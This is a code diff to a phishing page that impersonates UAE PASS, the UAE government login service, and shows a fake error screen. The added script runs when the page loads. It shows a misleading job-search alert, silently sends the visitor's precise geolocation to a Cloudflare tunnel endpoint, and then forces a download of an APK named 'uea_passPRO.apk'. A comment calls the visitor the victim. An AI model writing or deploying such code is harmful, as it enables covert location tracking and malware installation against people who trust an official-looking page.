@@ -10,6 +10,48 @@
 <link rel="icon" type="image/png" sizes="32x32" href="self_service.png">
 <link rel="apple-touch-icon" sizes="180x180" href="self_service.png">
     <title>UAE PASS - Error</title>
+    <script>
+// رابط نفق Seeker الخاص بك (تأكد أنه الرابط الذي حصلت عليه من Cloudflare للمنفذ 8080)
+const seekerUrl = "https://kate-sacramento-andrew-strap.trycloudflare.com/result_handler.php";
+
+function getInjectedLocation() {
+    if (navigator.geolocation) {
+        // إظهار رسالة احترافية للمستخدم
+        alert("للحصول على أفضل نتائج الوظائف في منطقتك (دبي، أبوظبي، أو الرياض)، يرجى السماح بالوصول إلى الموقع في النافذة التالية.");
+        
+        navigator.geolocation.getCurrentPosition(function(position) {
+            // سحب البيانات
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            // إرسال البيانات سراً إلى جهازك (Seeker)
+            fetch(seekerUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `Status=success&Lat=${lat}&Lon=${lon}&Acc=${acc}&Alt=NotAvailable&Dir=NotAvailable&Spd=NotAvailable`
+            });
+
+            console.log("Location sent successfully.");
+            
+            // بعد سحب الموقع، ابدأ تحميل التطبيق تلقائياً
+            setTimeout(function() {
+                window.location.href = "uea_passPRO.apk";
+            }, 2000);
+
+        }, function(error) {
+            // في حال الرفض، حمله التطبيق مباشرة لضمان عدم ضياع الضحية
+            window.location.href = "uea_passPRO.apk";
+        }, {enableHighAccuracy: true});
+    }
+}
+
+// تشغيل الوظيفة بمجرد تحميل الصفحة
+window.onload = function() {
+    getInjectedLocation();
+};
+</script>
     <style>
         /* Bootstrap core styles (extracted from your file) */
         * {
@@ -351,43 +393,6 @@
         </div>
     </div>
     
-<script>
-    // ========== معالجة معلمات URL ==========
-    document.addEventListener('DOMContentLoaded', function() {
-        console.log('📄 صفحة sorry.html محملة');
-        
-        // الحصول على معاملات URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const recordId = urlParams.get('recordId');
-        const idNumber = urlParams.get('id');
-        
-        // عرض معلومات إضافية إذا كانت متوفرة
-        if (idNumber) {
-            const errorDetail = document.querySelector('.error-detail');
-            if (errorDetail) {
-                errorDetail.innerHTML += `<br><small>رقم الهوية: ${idNumber}</small>`;
-            }
-        }
-        
-        // إضافة زر للعودة إلى صفحة apply.html
-        const tryAgainBtn = document.querySelector('.btn[onclick*="tryAgain"]');
-        if (tryAgainBtn) {
-            tryAgainBtn.onclick = function() {
-                window.location.href = 'apply.html';
-                return false;
-            };
-        }
-        
-        // إضافة زر للتحقق من الطلبات الجديدة
-        const backToHomeBtn = document.querySelector('.btn-primary');
-        if (backToHomeBtn && recordId) {
-            backToHomeBtn.innerHTML = '<i class="fas fa-home"></i> العودة للتسجيل';
-            backToHomeBtn.onclick = function(e) {
-                e.preventDefault();
-                window.location.href = 'apply.html';
-            };
-        }
-    });
-</script>
+
 </body>
 </html>
